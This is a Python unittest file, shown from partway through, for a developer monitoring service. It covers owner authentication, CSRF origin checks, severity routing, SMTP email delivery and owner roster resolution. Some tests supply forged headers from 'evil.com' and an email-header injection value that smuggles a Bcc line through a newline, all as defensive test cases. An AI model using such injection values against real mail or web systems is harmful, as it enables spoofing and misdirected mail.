    def test_load_config_none(self):
        for k in devmon_owner._REQUIRED:
            os.environ.pop(k, None)
        self.assertIsNone(devmon_owner.load_config())

    def test_load_config_partial_fails_closed(self):
        os.environ['DEV_MONITOR_OWNER'] = 'owner@example.test'
        os.environ.pop('DEV_MONITOR_PROXY_SECRET', None)
        os.environ.pop('DEV_MONITOR_SPOOL', None)
        os.environ.pop('DEV_MONITOR_DB', None)
        with self.assertRaises(devmon_owner.ConfigError):
            devmon_owner.load_config()
        os.environ.pop('DEV_MONITOR_OWNER', None)

    def test_load_config_full(self):
        env = {'DEV_MONITOR_OWNER': 'owner@example.test',
               'DEV_MONITOR_PROXY_SECRET': 's3cr3t',
               'DEV_MONITOR_SPOOL': '/tmp/spool', 'DEV_MONITOR_DB': '/tmp/db'}
        os.environ.update(env)
        cfg = devmon_owner.load_config()
        self.assertEqual(cfg['owner'], 'owner@example.test')
        for k in env:
            os.environ.pop(k, None)

    CFG = {'owner': 'owner@example.test', 'secret': 's3cr3t',
           'spool': '/tmp/s', 'db': '/tmp/d'}

    def test_require_owner_ok(self):
        h = FakeHandler({'X-Devmon-Proxy-Secret': 's3cr3t',
                         'X-Devmon-Owner': 'owner@example.test'})
        self.assertTrue(devmon_owner.require_owner(h, self.CFG))

    def test_require_owner_forged_header_fails(self):
        # a local process forges only the owner header (does not know the secret) → 403 (C1)
        h = FakeHandler({'X-Devmon-Owner': 'owner@example.test'})
        self.assertFalse(devmon_owner.require_owner(h, self.CFG))
        self.assertEqual(h.status, 403)
        self.assertNotIn('error', h.payload)                # zero response-body data

    def test_require_owner_wrong_owner_fails(self):
        h = FakeHandler({'X-Devmon-Proxy-Secret': 's3cr3t',
                         'X-Devmon-Owner': 'attacker@evil.com'})
        self.assertFalse(devmon_owner.require_owner(h, self.CFG))

    def test_csrf_good_origin(self):
        h = FakeHandler({'Origin': 'https://monitor.example.test', 'Host': 'monitor.example.test',
                         'Content-Type': 'application/json', 'Content-Length': '2'})
        self.assertTrue(devmon_owner.check_mutating(h))

    def test_csrf_origin_with_port_same_host_ok(self):
        # :9999 short URL access — Origin includes a port while nginx Host ($host) does not → pass by ignoring the port.
        h = FakeHandler({'Origin': 'http://monitor.example.test:9999', 'Host': 'monitor.example.test',
                         'Content-Type': 'application/json', 'Content-Length': '2'})
        self.assertTrue(devmon_owner.check_mutating(h))

    def test_csrf_cross_host_with_port_rejected(self):
        # even ignoring the port, reject a different hostname (external-origin CSRF)
        h = FakeHandler({'Origin': 'https://evil.com:9999', 'Host': 'monitor.example.test',
                         'Content-Type': 'application/json', 'Content-Length': '2'})
        self.assertFalse(devmon_owner.check_mutating(h))
        self.assertEqual(h.status, 403)

    def test_csrf_cross_origin_rejected(self):
        h = FakeHandler({'Origin': 'https://evil.com', 'Host': 'monitor.example.test',
                         'Content-Type': 'application/json', 'Content-Length': '2'})
        self.assertFalse(devmon_owner.check_mutating(h))
        self.assertEqual(h.status, 403)

    def test_csrf_missing_origin_rejected(self):
        h = FakeHandler({'Host': 'monitor.example.test', 'Content-Type': 'application/json',
                         'Content-Length': '2'})
        self.assertFalse(devmon_owner.check_mutating(h))

    def test_csrf_non_json_rejected(self):
        h = FakeHandler({'Origin': 'https://monitor.example.test', 'Host': 'monitor.example.test',
                         'Content-Type': 'text/plain', 'Content-Length': '2'})
        self.assertFalse(devmon_owner.check_mutating(h))
        self.assertEqual(h.status, 415)

    def test_csrf_oversize_rejected(self):
        h = FakeHandler({'Origin': 'https://monitor.example.test', 'Host': 'monitor.example.test',
                         'Content-Type': 'application/json',
                         'Content-Length': str(devmon_owner.MAX_BODY + 1)})
        self.assertFalse(devmon_owner.check_mutating(h))
        self.assertEqual(h.status, 413)


class TestSeverity(unittest.TestCase):
    """schema_version 2, the compatibility mapping, and the two axes never disagreeing."""

    def setUp(self):
        fresh_db()

    def _card(self, card_id):
        return next(c for c in MSG.feed('all')['messages'] if c['card_id'] == card_id)

    # ---- v2 accepted ----
    def test_every_severity_is_accepted_and_stored(self):
        for i, sev in enumerate(MSG.SEVERITIES):
            eid = 'sev-%d' % i
            self.assertEqual(MSG.ingest(msg2(event_id=eid, group_key=eid, severity=sev)),
                             'inserted')
            self.assertEqual(self._card(eid)['severity'], sev)

    def test_page_is_the_only_severity_that_pins(self):
        for i, sev in enumerate(MSG.SEVERITIES):
            eid = 'pin-%d' % i
            MSG.ingest(msg2(event_id=eid, group_key=eid, severity=sev))
            self.assertEqual(self._card(eid)['pinned'], sev == 'page',
                             'severity %s pinned wrongly' % sev)

    # ---- the compatibility mapping ----
    def test_v1_urgency_maps_to_severity_both_ways(self):
        MSG.ingest(msg(event_id='u1', group_key='u1', urgency='urgent'))
        MSG.ingest(msg(event_id='n1', group_key='n1', urgency='normal'))
        self.assertEqual(self._card('u1')['severity'], 'page')
        self.assertEqual(self._card('n1')['severity'], 'record')
        # ...and the derived urgency of a v2 card is what the pin and the promotion read.
        MSG.ingest(msg2(event_id='p1', group_key='p1', severity='page'))
        MSG.ingest(msg2(event_id='a1', group_key='a1', severity='attention'))
        self.assertEqual(self._card('p1')['urgency'], 'urgent')
        self.assertEqual(self._card('a1')['urgency'], 'normal')

    def test_a_v1_urgent_card_still_enqueues_the_urgent_lane(self):
        # The behaviour every existing cron depends on, asserted against the delivery row
        # rather than against the card: this is what "no producer has to change" means.
        MSG.ingest(msg(event_id='u2', group_key='u2', urgency='urgent'))
        rows = MSG._conn().execute(
            'SELECT channel FROM deliveries WHERE card_id=?', ('u2',)).fetchall()
        self.assertEqual([r['channel'] for r in rows], ['slack-urgent'])
        self.assertEqual(self._card('u2')['severity'], 'page')

    # ---- one axis per version ----
    def test_v2_rejects_urgency(self):
        p = msg2(); p['urgency'] = 'urgent'
        with self.assertRaises(MSG.ValidationError) as e:
            MSG.ingest(p)
        self.assertIn('schema_version 1', str(e.exception))

    def test_v1_rejects_severity(self):
        p = msg(); p['severity'] = 'page'
        with self.assertRaises(MSG.ValidationError) as e:
            MSG.ingest(p)
        self.assertIn('schema_version 2', str(e.exception))

    def test_v2_requires_a_severity(self):
        p = msg2(); del p['severity']
        with self.assertRaises(MSG.ValidationError):
            MSG.ingest(p)

    def test_unknown_severity_rejected(self):
        for bad in ('critical', 'PAGE', '', None, 1, True):
            p = msg2(); p['severity'] = bad
            with self.assertRaises(MSG.ValidationError, msg='accepted %r' % (bad,)):
                MSG.ingest(p)

    def test_schema_version_three_rejected(self):
        p = msg2(); p['schema_version'] = 3
        with self.assertRaises(MSG.ValidationError):
            MSG.ingest(p)

    # ---- D1_ROUTING, enforced at the boundary ----
    def test_a_severity_that_names_a_channel_is_rejected_by_that_name(self):
        # The producer says how much it matters; the box says where it goes. A generic
        # "invalid severity" would be true but useless — the mistake that actually happens
        # is somebody reaching for the channel they already have in mind.
        for name in ('email', 'slack', 'slack-urgent', 'slack-routine', 'console'):
            p = msg2(); p['severity'] = name
            with self.assertRaises(MSG.ValidationError) as e:
                MSG.ingest(p)
            self.assertIn('channel', str(e.exception), 'severity %r' % name)

    # ---- coalescing ----
    def test_severity_escalates_and_never_falls(self):
        MSG.ingest(msg2(event_id='e1', group_key='g', kind='info', severity='record'))
        MSG.ingest(msg2(event_id='e2', group_key='g', kind='info', severity='page'))
        self.assertEqual(self._card('e1')['severity'], 'page')
        self.assertEqual(self._card('e1')['urgency'], 'urgent')
        # A routine follow-up must not quietly undo the card that woke somebody up.
        MSG.ingest(msg2(event_id='e3', group_key='g', kind='info', severity='record'))
        self.assertEqual(self._card('e1')['severity'], 'page')
        self.assertEqual(self._card('e1')['urgency'], 'urgent')

    def test_escalation_is_order_independent_across_the_whole_grid(self):
        for a in MSG.SEVERITIES:
            for b in MSG.SEVERITIES:
                fresh_db()
                MSG.ingest(msg2(event_id='x', group_key='g', kind='info', severity=a))
                MSG.ingest(msg2(event_id='y', group_key='g', kind='info', severity=b))
                forward = self._card('x')['severity']
                fresh_db()
                MSG.ingest(msg2(event_id='x', group_key='g', kind='info', severity=b))
                MSG.ingest(msg2(event_id='y', group_key='g', kind='info', severity=a))
                self.assertEqual(forward, self._card('x')['severity'],
                                 'order changed the result for %s + %s' % (a, b))

    def test_a_v2_page_promotes_a_v1_normal_card(self):
        # The two versions coalesce onto one card, so the mapping has to hold across the seam.
        MSG.ingest(msg(event_id='m1', group_key='g', kind='info', urgency='normal'))
        self.assertEqual(self._card('m1')['severity'], 'record')
        MSG.ingest(msg2(event_id='m2', group_key='g', kind='info', severity='page'))
        self.assertEqual(self._card('m1')['severity'], 'page')
        self.assertEqual(self._card('m1')['urgency'], 'urgent')
        self.assertTrue(self._card('m1')['pinned'])
        rows = MSG._conn().execute(
            'SELECT channel FROM deliveries WHERE card_id=?', ('m1',)).fetchall()
        self.assertEqual([r['channel'] for r in rows], ['slack-urgent'])

    def test_a_card_written_before_this_column_reads_through_the_mapping(self):
        # Cards on a box that upgraded mid-flight have severity NULL. The screen must not show
        # them as blank, and coalescing must not read NULL as "less than everything" — an
        # earlier version of this test asserted the demotion instead of catching it, which is
        # how the defect survived its own coverage.
        MSG.ingest(msg(event_id='old', group_key='g', kind='info', urgency='urgent'))
        MSG._conn().execute('UPDATE cards SET severity=NULL WHERE card_id=?', ('old',))
        MSG._conn().commit()
        self.assertEqual(self._card('old')['severity'], 'page')
        MSG.ingest(msg2(event_id='new', group_key='g', kind='info', severity='record'))
        card = self._card('old')
        self.assertEqual(card['severity'], 'page',
                         'a routine occurrence demoted a card that predates the column')
        self.assertEqual(card['urgency'], 'urgent')

    def test_a_legacy_card_still_escalates(self):
        # Characterisation, not a regression test, and labelled so deliberately: the pre-fix
        # code returned the incoming severity whenever the stored one was NULL, so it passes
        # this case too. The two readings can only differ when the fallback outranks the
        # incoming value, which is the demotion above. This one records that the fix did not
        # buy that guarantee by freezing the card instead.
        MSG.ingest(msg(event_id='old', group_key='g', kind='info', urgency='normal'))
        MSG._conn().execute('UPDATE cards SET severity=NULL WHERE card_id=?', ('old',))
        MSG._conn().commit()
        MSG.ingest(msg2(event_id='new', group_key='g', kind='info', severity='page'))
        card = self._card('old')
        self.assertEqual(card['severity'], 'page')
        self.assertEqual(card['urgency'], 'urgent')
        rows = MSG._conn().execute(
            'SELECT channel FROM deliveries WHERE card_id=?', ('old',)).fetchall()
        self.assertEqual([r['channel'] for r in rows], ['slack-urgent'],
                         'the escalation off a NULL severity must still enqueue')

    # ---- needs_action rides along unchanged (P2's contract) ----
    def test_needs_action_still_works_on_v2(self):
        MSG.ingest(msg2(event_id='n2', group_key='n2', severity='attention',
                        needs_action=True))
        self.assertIs(self._card('n2')['needs_action'], True)
        self.assertEqual(MSG.needs_action_count(), 1)


class TestRouting(unittest.TestCase):
    """Routing is a pure function of severity, asserted over every cell of the grid."""

    # The policy, restated here on purpose. A test that imports MSG.ROUTING and compares it to
    # itself asserts nothing; this is the second copy that has to be changed deliberately.
    EXPECTED = {
        'page':      ('console', 'slack-urgent', 'email'),
        'attention': ('console', 'slack-routine'),
        'record':    ('console',),
        'digest':    ('console',),
    }
    CHANNELS = ('console', 'slack-urgent', 'slack-routine', 'email')

    def setUp(self):
        fresh_db()

    def test_every_cell_of_the_grid(self):
        # All 4x4 cells, the empty ones included: a routing bug is a channel that appears
        # where it should not far more often than one that goes missing.
        for severity in MSG.SEVERITIES:
            got = MSG.route(severity)
            for channel in self.CHANNELS:
                self.assertEqual(
                    channel in got, channel in self.EXPECTED[severity],
                    '%s -> %s: expected %s, got %s'
                    % (severity, channel, self.EXPECTED[severity], got))

    def test_console_is_in_every_row_and_first(self):
        # There is no argument that turns the console off, so there must be no code path
        # that can: whatever goes out, the card stays.
        for severity in MSG.SEVERITIES:
            self.assertEqual(MSG.route(severity)[0], MSG.CONSOLE)

    def test_the_table_covers_every_severity_and_invents_none(self):
        self.assertEqual(set(MSG.ROUTING), set(MSG.SEVERITIES))

    def test_it_is_a_function_of_severity_and_nothing_else(self):
        # Called twice with unrelated state changed in between; a table that reads the
        # config or the clock would drift here.
        before = {s: MSG.route(s) for s in MSG.SEVERITIES}
        MSG.ingest(msg2(event_id='noise', group_key='noise', severity='page'))
        MSG.set_enabled_channels(())
        try:
            self.assertEqual(before, {s: MSG.route(s) for s in MSG.SEVERITIES})
        finally:
            MSG.set_enabled_channels(('slack-urgent', 'slack-routine'))

    def test_an_unknown_severity_raises_rather_than_defaulting(self):
        # A silent default would route an unroutable card to the console and look fine.
        for bad in ('critical', None, ''):
            with self.assertRaises(ValueError):
                MSG.route(bad)

    # ---- what ingest actually enqueues ----
    def _channels_for(self, card_id):
        rows = MSG._conn().execute(
            'SELECT channel FROM deliveries WHERE card_id=? ORDER BY channel',
            (card_id,)).fetchall()
        return [r['channel'] for r in rows]

    def test_ingest_enqueues_what_the_table_says(self):
        MSG.set_enabled_channels(('slack-urgent', 'slack-routine', 'email'))
        try:
            for severity in MSG.SEVERITIES:
                fresh_db()
                MSG.set_enabled_channels(('slack-urgent', 'slack-routine', 'email'))
                MSG.ingest(msg2(event_id='r', group_key='r', kind='info', severity=severity))
                expected = sorted(c for c in self.EXPECTED[severity] if c != 'console')
                self.assertEqual(self._channels_for('r'), expected, 'severity %s' % severity)
        finally:
            MSG.set_enabled_channels(('slack-urgent', 'slack-routine'))

    def test_record_and_digest_enqueue_nothing_at_all(self):
        MSG.set_enabled_channels(('slack-urgent', 'slack-routine', 'email'))
        try:
            for severity in ('record', 'digest'):
                fresh_db()
                MSG.set_enabled_channels(('slack-urgent', 'slack-routine', 'email'))
                MSG.ingest(msg2(event_id='q', group_key='q', kind='info', severity=severity))
                self.assertEqual(self._channels_for('q'), [])
                # ...and the card is there regardless. The console column is never absent.
                self.assertEqual(len(MSG.feed('all')['messages']), 1)
        finally:
            MSG.set_enabled_channels(('slack-urgent', 'slack-routine'))

    def test_a_lane_this_box_cannot_deliver_to_gets_no_rows(self):
        # The 2026-07-30 shape: a webhook was empty, the worker never started, and four
        # urgent cards sat in the queue for nine days while health reported "on". Rows for a
        # lane with no worker are that incident, so they are not written at all — and the
        # policy still says page -> email, which is what the settings screen reads.
        MSG.set_enabled_channels(('slack-urgent',))
        try:
            MSG.ingest(msg2(event_id='p', group_key='p', kind='info', severity='page'))
            self.assertEqual(self._channels_for('p'), ['slack-urgent'])
            self.assertIn('email', MSG.route('page'))
            self.assertNotIn('email', MSG.enqueue_channels('page'))
        finally:
            MSG.set_enabled_channels(('slack-urgent', 'slack-routine'))

    def test_an_escalation_enqueues_for_the_new_severity_and_a_repeat_does_not(self):
        MSG.ingest(msg2(event_id='c1', group_key='g', kind='info', severity='record'))
        self.assertEqual(self._channels_for('c1'), [])
        MSG.ingest(msg2(event_id='c2', group_key='g', kind='info', severity='attention'))
        self.assertEqual(self._channels_for('c1'), ['slack-routine'])
        MSG.ingest(msg2(event_id='c3', group_key='g', kind='info', severity='page'))
        self.assertEqual(self._channels_for('c1'), ['slack-routine', 'slack-urgent'])
        # A fourth occurrence at the same severity is not a second page. One noisy producer
        # must not become a pager storm; that is what the coalescing window is for.
        MSG.ingest(msg2(event_id='c4', group_key='g', kind='info', severity='page'))
        self.assertEqual(self._channels_for('c1'), ['slack-routine', 'slack-urgent'])


class TestEmailTransport(unittest.TestCase):
    """The email lane: its config, what it does when there is none, and how it fails."""

    ENV = {'DEV_MONITOR_SMTP_HOST': 'relay.example.test',
           'DEV_MONITOR_SMTP_FROM': 'dev-monitor@example.test',
           'DEV_MONITOR_SMTP_TO': 'owner@example.test'}

    def setUp(self):
        fresh_db()

    # ---- config: all or nothing ----
    def test_a_complete_environment_configures_the_lane(self):
        cfg = devmon_email.config_from_env(dict(self.ENV))
        self.assertIsNotNone(cfg)
        self.assertEqual(cfg['host'], 'relay.example.test')
        self.assertEqual(cfg['to'], ('owner@example.test',))
        self.assertEqual(cfg['port'], devmon_email.DEFAULT_PORT)

    def test_every_missing_piece_disables_the_lane(self):
        # A host with no recipient is not a partly working email path; it is a lane that
        # would take rows and never deliver them.
        for missing in self.ENV:
            env = dict(self.ENV)
            del env[missing]
            self.assertIsNone(devmon_email.config_from_env(env),
                              'configured with no %s' % missing)
        self.assertIsNone(devmon_email.config_from_env({}))

    def test_a_misspelled_port_disables_the_lane_rather_than_guessing(self):
        # Falling back to 587 here would mean the operator's typo never surfaces anywhere.
        for bad in ('five87', '0', '65536', '-1'):
            env = dict(self.ENV, DEV_MONITOR_SMTP_PORT=bad)
            self.assertIsNone(devmon_email.config_from_env(env), 'accepted port %r' % bad)

    def test_multiple_recipients(self):
        env = dict(self.ENV, DEV_MONITOR_SMTP_TO='a@example.test, b@example.test')
        self.assertEqual(devmon_email.config_from_env(env)['to'],
                         ('a@example.test', 'b@example.test'))

    # ---- the message ----
    def test_the_subject_is_the_title_and_the_body_carries_the_action(self):
        subject, body = devmon_email.format_message(
            {'title': 'Disk 92%', 'source': 'resource', 'kind': 'action',
             'body': 'State: nearly full', 'action_line': 'Clean up the old logs'},
            console_url='https://console.example.test/')
        self.assertEqual(subject, 'Disk 92%')
        self.assertIn('State: nearly full', body)
        self.assertIn('What to do: Clean up the old logs', body)
        self.assertIn('https://console.example.test/', body)

    def test_the_built_message_addresses_every_recipient(self):
        cfg = devmon_email.config_from_env(
            dict(self.ENV, DEV_MONITOR_SMTP_TO='a@example.test,b@example.test'))
        msg = devmon_email.build_email(cfg, 'subject', 'body')
        self.assertEqual(msg['To'], 'a@example.test, b@example.test')
        self.assertEqual(msg['From'], 'dev-monitor@example.test')

    # ---- failure classification ----
    def test_a_5xx_is_terminal_and_a_4xx_is_not(self):
        # Retrying a permanent refusal burns the attempt budget and delays nothing but the
        # failure; retrying a temporary one is the whole point of the outbox.
        self.assertTrue(devmon_email._terminal_smtp(550))
        self.assertTrue(devmon_email._terminal_smtp(552))
        self.assertFalse(devmon_email._terminal_smtp(451))
        self.assertFalse(devmon_email._terminal_smtp(421))
        self.assertFalse(devmon_email._terminal_smtp('ConnectionRefusedError'))

    def test_send_never_returns_the_password_or_the_host(self):
        # The reason string lands in deliveries.last_error, which the settings screen renders.
        cfg = dict(devmon_email.config_from_env(dict(self.ENV)),
                   password='hunter2-not-a-real-secret', user='someone')
        with unittest.mock.patch.object(
                devmon_email.smtplib, 'SMTP',
                side_effect=OSError('connect to relay.example.test failed as someone')):
            ok, reason = devmon_email.send(cfg, 'subject', 'body')
        self.assertFalse(ok)
        self.assertEqual(reason, 'OSError')

    def test_every_recipient_refused_is_not_a_success(self):
        cfg = devmon_email.config_from_env(dict(self.ENV))
        server = unittest.mock.MagicMock()
        server.has_extn.return_value = False
        server.send_message.return_value = {'owner@example.test': (550, b'no such user')}
        with unittest.mock.patch.object(devmon_email.smtplib, 'SMTP', return_value=server):
            ok, reason = devmon_email.send(cfg, 'subject', 'body')
        self.assertFalse(ok)
        self.assertEqual(reason, 'all recipients refused')

    def test_a_partial_refusal_is_a_delivery_that_happened(self):
        # Two recipients, one refused. The other one has the mail. Calling that a failure
        # makes the worker retry and send it to them again, up to the attempt cap.
        cfg = devmon_email.config_from_env(
            dict(self.ENV, DEV_MONITOR_SMTP_TO='ok@example.test,bad@example.test'))
        server = unittest.mock.MagicMock()
        server.has_extn.return_value = False
        server.send_message.return_value = {'bad@example.test': (550, b'no such user')}
        with unittest.mock.patch.object(devmon_email.smtplib, 'SMTP', return_value=server):
            ok, code = devmon_email.send(cfg, 'subject', 'body')
        self.assertTrue(ok, 'a message that reached one recipient must not be resent to them')
        self.assertEqual(code, 250)

    def test_a_duplicate_recipient_cannot_make_a_total_refusal_look_partial(self):
        # smtplib keys its refusal dict by address, so `a@x,a@x` refused by everybody comes
        # back as one entry against two configured recipients. Counting alone called that a
        # partial success and marked a delivery nobody received as sent.
        cfg = devmon_email.config_from_env(
            dict(self.ENV, DEV_MONITOR_SMTP_TO='a@example.test, a@example.test'))
        self.assertEqual(cfg['to'], ('a@example.test',), 'recipients must be de-duplicated')
        server = unittest.mock.MagicMock()
        server.has_extn.return_value = False
        server.send_message.return_value = {'a@example.test': (550, b'no')}
        with unittest.mock.patch.object(devmon_email.smtplib, 'SMTP', return_value=server):
            ok, reason = devmon_email.send(cfg, 'subject', 'body')
        self.assertFalse(ok, 'nobody received this message')
        self.assertEqual(reason, 'all recipients refused')

    def test_a_failing_ledger_write_does_not_strand_the_rest_of_the_batch(self):
        # The realistic trigger is `database is locked`: four threads hold BEGIN IMMEDIATE on
        # one SQLite file. If that escapes the row, every row claimed after it stays in
        # `claimed` with no error until the lease expires — the exact state the per-row guard
        # was added to prevent, which the first version of that guard did not cover because
        # the ledger calls sat outside it.
        MSG.set_enabled_channels(('email',))
        for i in range(3):
            MSG.ingest(msg2(event_id='q%d' % i, group_key='q%d' % i, kind='info',
                            severity='page'))
        cfg = devmon_email.config_from_env(dict(self.ENV))
        stop = unittest.mock.Mock()
        stop.is_set.side_effect = [False, True]
        stop.wait.return_value = False
        server = unittest.mock.MagicMock()
        server.has_extn.return_value = False
        server.send_message.return_value = {}
        real_sent = MSG.delivery_sent
        calls = []

        def flaky_sent(delivery_id, card_id, worker):
            calls.append(delivery_id)
            if len(calls) == 1:
                raise sqlite3.OperationalError('database is locked')
            return real_sent(delivery_id, card_id, worker)

        with unittest.mock.patch.object(devmon_email.smtplib, 'SMTP', return_value=server), \
                unittest.mock.patch.object(MSG, 'delivery_sent', side_effect=flaky_sent):
            devmon_email.run_worker(cfg, stop)
        rows = MSG._conn().execute(
            'SELECT status FROM deliveries ORDER BY id').fetchall()
        self.assertEqual([r['status'] for r in rows], ['claimed', 'sent', 'sent'],
                         'one unwritable row took the rest of the batch with it')

    def test_a_title_with_a_newline_still_sends(self):
        # The validator accepts a title containing CR/LF; EmailMessage refuses one. Left
        # alone that raises out of the worker's per-row loop.
        subject, _ = devmon_email.format_message(
            {'title': 'good\nBcc: attacker@example.test', 'source': 's', 'kind': 'info'})
        self.assertEqual(subject, 'good Bcc: attacker@example.test')
        cfg = devmon_email.config_from_env(dict(self.ENV))
        self.assertEqual(devmon_email.build_email(cfg, subject, 'body')['Subject'], subject)

    def test_one_unsendable_row_does_not_strand_the_rest_of_the_batch(self):
        # The failure shape: an exception escaping the per-row loop leaves this row and every
        # row claimed after it in `claimed` with no error, invisible until the lease expires.
        MSG.set_enabled_channels(('email',))
        for i in range(3):
            MSG.ingest(msg2(event_id='p%d' % i, group_key='p%d' % i, kind='info',
                            severity='page'))
        cfg = devmon_email.config_from_env(dict(self.ENV))
        stop = unittest.mock.Mock()
        stop.is_set.side_effect = [False, True]
        stop.wait.return_value = False
        server = unittest.mock.MagicMock()
        server.has_extn.return_value = False
        server.send_message.return_value = {}
        with unittest.mock.patch.object(devmon_email, 'config_from_env', return_value=cfg), \
                unittest.mock.patch.object(devmon_email.smtplib, 'SMTP', return_value=server), \
                unittest.mock.patch.object(
                    devmon_email, 'format_message',
                    side_effect=[ValueError('bad header'), ('s', 'b'), ('s', 'b')]):
            devmon_email.run_worker(cfg, stop)
        rows = MSG._conn().execute(
            'SELECT status, last_error FROM deliveries ORDER BY id').fetchall()
        self.assertEqual([r['status'] for r in rows], ['failed', 'sent', 'sent'])
        self.assertIn('unsendable', rows[0]['last_error'])

    def test_a_clean_send_is_a_success(self):
        cfg = devmon_email.config_from_env(dict(self.ENV))
        server = unittest.mock.MagicMock()
        server.has_extn.return_value = False
        server.send_message.return_value = {}
        with unittest.mock.patch.object(devmon_email.smtplib, 'SMTP', return_value=server):
            ok, code = devmon_email.send(cfg, 'subject', 'body')
        self.assertTrue(ok)
        self.assertEqual(code, 250)
        server.login.assert_not_called()      # no credential configured, so none offered

    def test_a_credential_is_used_when_one_is_configured(self):
        cfg = devmon_email.config_from_env(
            dict(self.ENV, DEV_MONITOR_SMTP_USER='u', DEV_MONITOR_SMTP_PASSWORD='p'))
        server = unittest.mock.MagicMock()
        server.has_extn.return_value = True
        server.send_message.return_value = {}
        with unittest.mock.patch.object(devmon_email.smtplib, 'SMTP', return_value=server):
            devmon_email.send(cfg, 'subject', 'body')
        server.starttls.assert_called_once()
        server.login.assert_called_once_with('u', 'p')

    # ---- the lane on the outbox ----
    def test_a_page_writes_an_email_row_when_the_lane_is_enabled(self):
        MSG.set_enabled_channels(('slack-urgent', 'email'))
        MSG.ingest(msg2(event_id='p', group_key='p', kind='info', severity='page'))
        rows = MSG._conn().execute(
            'SELECT channel FROM deliveries WHERE card_id=? ORDER BY channel',
            ('p',)).fetchall()
        self.assertEqual([r['channel'] for r in rows], ['email', 'slack-urgent'])

    def test_the_slack_worker_never_sees_an_email_row(self):
        # P1's channel-scoped claim, re-run over the new channel rather than assumed to cover it.
        MSG.set_enabled_channels(('slack-urgent', 'email'))
        MSG.ingest(msg2(event_id='p', group_key='p', kind='info', severity='page'))
        for lane in ('slack-urgent', 'email'):
            claimed = MSG.claim_due_deliveries(lane, 10)
            self.assertEqual([c['channel'] for c in claimed], [lane])

    def test_a_terminal_email_failure_does_not_stall_the_slack_lane(self):
        MSG.set_enabled_channels(('slack-urgent', 'email'))
        MSG.ingest(msg2(event_id='p', group_key='p', kind='info', severity='page'))
        bad = MSG.claim_due_deliveries('email', 10)[0]
        MSG.delivery_failed(bad['id'], bad['claimed_by'], 'smtp 550')
        good = MSG.claim_due_deliveries('slack-urgent', 10)[0]
        MSG.delivery_sent(good['id'], good['card_id'], good['claimed_by'])
        self.assertEqual(MSG.delivery_lane_health('slack-urgent')['pending_count'], 0)
        self.assertIn('550', MSG.delivery_lane_health('email')['last_error'])

    def test_with_no_transport_a_page_writes_no_email_row_but_keeps_the_rule(self):
        # The rule and this box's ability to obey it are two facts. Collapsing them is how
        # the first one disappears from the screen.
        MSG.set_enabled_channels(('slack-urgent', 'slack-routine'))
        MSG.ingest(msg2(event_id='p', group_key='p', kind='info', severity='page'))
        rows = MSG._conn().execute(
            "SELECT channel FROM deliveries WHERE card_id=?", ('p',)).fetchall()
        self.assertEqual([r['channel'] for r in rows], ['slack-urgent'])
        self.assertIn('email', MSG.route('page'))


def _write_roster(path, generated_at, people=None):
    if people is None:
        people = {'@alice': {'name': 'Alice Example', 'email': 'alice@example.test',
                             'slack_member_id': 'U01ALICE'}}
    with open(path, 'w', encoding='utf-8') as fh:
        json.dump({'generated_at': generated_at, 'source': 'test', 'people': people}, fh)


class TestOwnerRoster(unittest.TestCase):
    """P4: a producer states who a card is, the roster resolves it, and every one of the
    five ways a snapshot can fail to be trustworthy — plus a sixth, an id it does not
    contain — falls back to the box owner without ever blocking delivery or staying quiet
    about it."""

    BOX_OWNER = 'box-owner@example.test'

    def setUp(self):
        fresh_db()
        self.tmpdir = tempfile.mkdtemp()
        self.roster_path = os.path.join(self.tmpdir, 'roster.json')
        MSG.set_box_owner(self.BOX_OWNER)

    def tearDown(self):
        MSG.set_roster_path('')
        MSG.set_box_owner(None)

    def _card(self, card_id):
        return next(c for c in MSG.feed('all')['messages'] if c['card_id'] == card_id)

    def _fresh_roster(self, people=None):
        _write_roster(self.roster_path, MSG.iso(MSG.now_utc()), people)
        MSG.set_roster_path(self.roster_path)

    # ---- payload validation ----
    def test_owner_accepted_with_or_without_at_and_normalised_with_it(self):
        MSG.ingest(msg2(event_id='a', group_key='a', owner='@alice'))
        MSG.ingest(msg2(event_id='b', group_key='b', owner='alice'))
        self.assertEqual(self._card('a')['owner'], '@alice')
        self.assertEqual(self._card('b')['owner'], '@alice')

    def test_owner_is_optional_and_absent_reads_as_none(self):
        MSG.ingest(msg2(event_id='n', group_key='n'))
        self.assertIsNone(self._card('n')['owner'])

    def test_owner_accepted_on_v1_too(self):
        MSG.ingest(msg(event_id='v1', group_key='v1', owner='alice'))
        self.assertEqual(self._card('v1')['owner'], '@alice')

    def test_invalid_owner_rejected(self):
        for bad in ('', '@', 'a b', 'a/b', 'x' * 65, 1, True, ['@a']):
            p = msg2(owner=bad)
            with self.assertRaises(MSG.ValidationError, msg='accepted %r' % (bad,)):
                MSG.ingest(p)

    # ---- coalescing: a differing owner starts a new card (P4's invariant) ----
    def test_a_differing_owner_starts_a_new_card(self):
        MSG.ingest(msg2(event_id='o1', group_key='g', kind='info', owner='alice'))
        result = MSG.ingest(msg2(event_id='o2', group_key='g', kind='info', owner='bob'))
        self.assertEqual(result, 'inserted')
        self.assertEqual(len(MSG.feed('all')['messages']), 2)

    def test_the_same_owner_still_coalesces(self):
        MSG.ingest(msg2(event_id='o1', group_key='g', kind='info', owner='alice'))
        result = MSG.ingest(msg2(event_id='o2', group_key='g', kind='info', owner='alice'))
        self.assertEqual(result, 'coalesced')
        self.assertEqual(len(MSG.feed('all')['messages']), 1)

    def test_two_undeclared_occurrences_still_coalesce_with_each_other(self):
        # NULL owner must not behave like a value nothing else can ever equal.
        MSG.ingest(msg2(event_id='o1', group_key='g', kind='info'))
        result = MSG.ingest(msg2(event_id='o2', group_key='g', kind='info'))
        self.assertEqual(result, 'coalesced')
        self.assertEqual(len(MSG.feed('all')['messages']), 1)

    def test_declaring_an_owner_on_a_repeat_starts_a_new_card_not_a_coalesce(self):
        MSG.ingest(msg2(event_id='o1', group_key='g', kind='info'))
        result = MSG.ingest(msg2(event_id='o2', group_key='g', kind='info', owner='alice'))
        self.assertEqual(result, 'inserted')
        self.assertEqual(len(MSG.feed('all')['messages']), 2)

    # ---- resolution: the happy path ----
    def test_a_fresh_roster_resolves_name_email_and_slack_id(self):
        self._fresh_roster()
        MSG.ingest(msg2(event_id='r', group_key='r', owner='alice'))
        resolved = self._card('r')['owner_resolved']
        self.assertEqual(resolved['owner'], '@alice')
        self.assertEqual(resolved['name'], 'Alice Example')
        self.assertEqual(resolved['email'], 'alice@example.test')
        self.assertEqual(resolved['slack_member_id'], 'U01ALICE')
        self.assertFalse(resolved['fallback'])
        self.assertIsNone(resolved['fallback_reason'])

